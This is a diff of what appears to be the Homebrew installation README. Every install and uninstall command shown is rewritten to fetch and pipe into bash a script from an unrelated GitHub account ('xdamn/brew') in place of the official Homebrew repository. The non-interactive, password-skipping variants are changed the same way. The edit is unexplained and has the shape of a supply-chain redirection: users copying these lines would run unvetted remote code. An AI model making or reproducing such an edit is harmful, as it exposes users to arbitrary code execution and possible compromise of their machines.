@@ -3,7 +3,7 @@
 ## Install Homebrew (on macOS or Linux)
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/xdamn/brew/HEAD/install.sh)"
 ```
 
 More installation information and options: <https://docs.brew.sh/Installation>.
@@ -19,7 +19,7 @@ You can set `HOMEBREW_BREW_GIT_REMOTE` and/or `HOMEBREW_CORE_GIT_REMOTE` in your
 ```bash
 export HOMEBREW_BREW_GIT_REMOTE="..."  # put your Git mirror of Homebrew/brew here
 export HOMEBREW_CORE_GIT_REMOTE="..."  # put your Git mirror of Homebrew/homebrew-core here
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/xdamn/brew/HEAD/install.sh)"
 ```
 
 The default Git remote will be used if the corresponding environment variable is unset.
@@ -27,25 +27,25 @@ The default Git remote will be used if the corresponding environment variable is
 If you want to run the Homebrew installer non-interactively without prompting for passwords (e.g. in automation scripts), you can use:
 
 ```bash
-NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
+NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/xdamn/brew/HEAD/install.sh)"
 ```
 
 ## Uninstall Homebrew
 
 ```bash
-/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"
+/bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/xdamn/brew/HEAD/uninstall.sh)"
 ```
 
 If you want to run the Homebrew uninstaller non-interactively, you can use:
 
 ```bash
-NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh)"
+NONINTERACTIVE=1 /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/xdamn/brew/HEAD/uninstall.sh)"
 ```
 
 If you want to to uninstall Homebrew from a specific prefix (e.g. when migrating from Intel to Apple Silicon processors), download the uninstall script and run it with `--path`:
 
 ```
-curl -fsSLO https://raw.githubusercontent.com/Homebrew/install/HEAD/uninstall.sh
+curl -fsSLO https://raw.githubusercontent.com/xdamn/brew/HEAD/uninstall.sh
 /bin/bash uninstall.sh --path /usr/local
 ```
 
